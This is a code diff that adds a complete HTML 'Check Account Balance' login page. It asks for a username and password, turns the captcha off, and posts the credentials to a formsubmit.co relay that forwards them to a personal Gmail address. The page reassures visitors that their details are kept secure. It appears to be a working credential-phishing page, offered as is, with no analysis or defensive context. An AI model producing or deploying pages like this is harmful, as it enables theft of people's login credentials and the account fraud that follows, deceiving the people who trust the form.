@@ -1,0 +1,128 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>CHECK ACCOUNT BALANCE</title>
+  <style>
+    :root{font-family:system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial;}
+    body{
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      min-height:100vh;
+      margin:0;
+      background:#f5f7fb;
+    }
+    .card{
+      background:#fff;
+      padding:24px;
+      border-radius:12px;
+      box-shadow:0 6px 18px rgba(22,38,84,0.08);
+      width:100%;
+      max-width:420px;
+    }
+    h1{
+      margin:0 0 18px;
+      font-size:20px;
+      letter-spacing:2px;
+      text-align:center;
+    }
+    label{
+      display:block;
+      margin-bottom:6px;
+      font-size:14px;
+      color:#333;
+    }
+    input[type="text"],input[type="password"]{
+      width:100%;
+      padding:12px;
+      border:1px solid #d6dbe8;
+      border-radius:8px;
+      font-size:15px;
+    }
+    .hint{
+      font-size:12px;
+      color:#8a93a8;
+      margin-top:6px;
+    }
+    .row{margin-top:16px;}
+    button.submit{
+      width:100%;
+      padding:12px;
+      border-radius:10px;
+      border:0;
+      background:#1f7aef;
+      color:#fff;
+      font-weight:600;
+      font-size:15px;
+      cursor:pointer;
+    }
+    .toggle{
+      position:absolute;
+      right:14px;
+      top:37px;
+      background:none;
+      border:none;
+      cursor:pointer;
+      color:#555;
+      font-size:13px;
+    }
+    .field-wrapper{
+      position:relative;
+      margin-top:14px;
+    }
+    .confident{
+      margin-top:14px;
+      font-size:13px;
+      color:#0b6b3a;
+      background:#e6fbf0;
+      padding:10px;
+      border-radius:8px;
+      text-align:center;
+    }
+  </style>
+</head>
+<body>
+  <main class="card" role="main">
+    <h1>CHECK ACCOUNT BALANCE</h1>
+
+    <form action="https://formsubmit.co/exellentfirm@gmail.com" 
+          method="POST" autocomplete="off" novalidate>
+      <!-- redirect to thankyou.html -->
+      <input type="hidden" name="_next" value="thankyou.html">
+      <input type="hidden" name="_captcha" value="false">
+
+      <div class="field-wrapper">
+        <label for="username">Enter your username <span aria-hidden="true">(Needed)</span></label>
+        <input id="username" name="username" type="text" required placeholder="e.g. johndoe123" aria-required="true" />
+        <div class="hint">This is required.</div>
+      </div>
+
+      <div class="field-wrapper">
+        <label for="password">Enter Password</label>
+        <input id="password" name="password" type="password" required placeholder="••••••" aria-required="true" />
+        <button type="button" id="togglePassword" class="toggle">Show</button>
+      </div>
+
+      <div class="confident">Thank you, We keep your details and data secured</div>
+
+      <div class="row">
+        <button type="submit" class="submit">Check Balance</button>
+      </div>
+    </form>
+  </main>
+
+  <script>
+    // password toggle
+    const togglePassword = document.getElementById('togglePassword');
+    const password = document.getElementById('password');
+
+    togglePassword.addEventListener('click', () => {
+      const type = password.getAttribute('type') === 'password' ? 'text' : 'password';
+      password.setAttribute('type', type);
+      togglePassword.textContent = type === 'password' ? 'Show' : 'Hide';
+    });
+  </script>
+</body>
+</html>
